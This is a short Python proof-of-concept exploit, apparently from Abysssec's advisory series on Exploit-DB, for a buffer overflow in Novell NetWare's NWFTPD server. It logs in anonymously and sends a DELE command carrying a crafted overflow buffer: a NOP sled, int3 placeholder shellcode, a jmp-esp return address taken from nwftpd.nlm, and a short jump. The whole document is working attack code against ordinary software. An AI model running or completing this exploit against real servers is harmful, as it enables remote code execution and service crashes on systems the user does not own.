'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ <  Day 7 - (Binary Analysis)
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

 http://www.exploit-db.com/moaub-7-novell-netware-nwftpd-rmdrnfrdele-argument-parsing-buffer-overflow/
'''

'''
  Title            :  Novell Netware NWFTPD RMD/RNFR/DELE Argument Parsing Buffer overflow
  Version          :  NWFTPD.NLM 5.09.02 (Netware 6.5  SP8)
  Analysis         :  http://www.abysssec.com
  Vendor           :  http://www.Novell.com
  Impact           :  Critical
  Contact          :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter          :  @abysssec
'''
from ftplib import FTP
import sys

try:
	netwareServerIp = '127.0.0.1'
	ftp = FTP(netwareServerIp) 				
	ftp.login('anonymous','a@a') 
	buffer = "/"
	buffer += "\x90"*107  				#nops
	buffer += "\xcc"*413				#shellcode part2 = 413 byte
	buffer += "\xb9\xa4\xe0\x91"			#EIP - jmp esp from nwftpd.nlm module
	buffer += "\xcc"*124				#shellcode part1 = 124 byte
	buffer += "\x08\xeb\x90\x90\x90\x90" 		#short jmp to shellcode part2 
	ftp.voidcmd('DELE ' + buffer) 
	
except Exception,err:
	print err